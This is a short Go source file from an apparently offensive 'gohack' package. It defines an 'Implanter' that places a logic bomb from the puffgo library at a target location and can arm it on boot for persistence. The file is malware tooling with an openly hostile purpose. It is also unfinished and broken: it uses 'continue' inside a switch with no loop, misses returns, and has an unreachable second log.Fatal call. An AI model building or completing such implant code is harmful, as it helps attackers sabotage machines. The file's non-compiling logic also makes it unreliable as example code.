package gohack

import (
	"errors"
	"fmt"
	"log"
	"runtime"

	"github.com/NovusEdge/puffgo"
)

type Implanter struct {

	// Bomb object; check the puffgo project for more info!
	Bomb puffgo.LogicBomb

	// Location specifies the location where the bomb will be implanted
	Location string

	// OnBoot specifies if the bomb will be armed on boot, i.e. if the
	// bomb will run in a persistent process.
	OnBoot bool
}

//NewImplanter creates an instance of Implanter.
func NewImplanter(bomb puffgo.LogicBomb, location string, onBoot bool) Implanter {

	return Implanter{
		Bomb:     bomb,
		Location: location,
		OnBoot:   onBoot,
	}
}

//Implant implants Bomb in the specified location: Location
func (i *Implanter) Implant() error {
	filePath, outCode, creationError := i.CreateImplantFile()

	if creationError != nil || outCode != 0 || filePath == "" {
		e := errors.New(fmt.Sprintf("E: Could not implant the bomb at: %s", filePath))
		log.Fatal(e)
		log.Fatal(fmt.Sprintf("Cause of error: %s", creationError))
	}

	return nil
}

//
func (i *Implanter) CreateImplantFile() (string, int, error) {
	OS := runtime.GOOS

	switch OS {
	case "windows":
		continue
	case "linux":
		continue
	case "darwin":
		continue
	default:
		return "", 1, errors.New("E: This OS is not supported. :(")
	}
}
